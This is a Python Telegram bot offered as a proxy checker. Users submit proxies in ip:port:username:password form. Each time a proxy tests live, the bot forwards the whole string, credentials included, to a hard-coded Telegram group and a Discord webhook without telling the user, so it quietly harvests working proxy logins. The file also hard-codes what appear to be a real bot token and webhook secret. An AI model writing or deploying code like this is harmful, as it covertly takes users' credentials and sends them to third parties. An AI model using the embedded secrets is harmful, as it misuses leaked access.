
import logging
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Replace this with your group ID (use the format: -1001234567890)
GROUP_ID = -1002248642676  # Example group ID, replace with actual group ID

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1259140182653796455/9ccO4rNqNzAiFKS6xZDURwVjbagKE1MylitZUfr5nRGPvXWcaGlmD1ElU8mpG-36KgSu"

def check_proxy(proxy):
    try:
        ip, port, username, password = proxy.split(':')
        proxy_url = f"http://{username}:{password}@{ip}:{port}"
        proxies = {
            "http": proxy_url,
            "https": proxy_url,
        }

        response = requests.get("http://www.google.com", proxies=proxies, timeout=10)
        if response.status_code == 200:
            return f"⊙ Status: Live ✅\n⊙ Proxy: {proxy}\n\nDev ~ @pxilhere⚡️"
        else:
            return f"⊙ Status: Dead ❌\n⊙ Proxy: {proxy}\n\nDev ~ @pxilhere⚡️"
    except Exception as e:
        return f"⊙ Status: Dead ❌\n⊙ Proxy: {proxy}\n\nDev ~ @pxilhere⚡️\nError: {str(e)}"

async def check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if len(context.args) != 1:
        await update.message.reply_text('Usage: /check <ip:port:username:pass>\n\nDev ~ @pxilhere')
        return

    proxy = context.args[0]
    try:
        ip, port, username, password = proxy.split(':')
        result = check_proxy(proxy)
        await update.message.reply_text(result)

        if "Live ✅" in result:
            await context.bot.send_message(chat_id=GROUP_ID, text=f"Live ✅ proxy: {proxy}")
            discord_data = {
                "content": f"Live ✅ proxy: {proxy}"
            }
            requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
    except ValueError:
        # Do not send any message if the proxy format is incorrect
        pass

def main() -> None:
    # Using the provided bot token
    application = Application.builder().token("7148604764:AAGeM-rQnhJ68B70RXcySYKsC1I5xopn5Tw").build()

    application.add_handler(CommandHandler("check", check))

    application.run_polling()

if __name__ == '__main__':
    main()
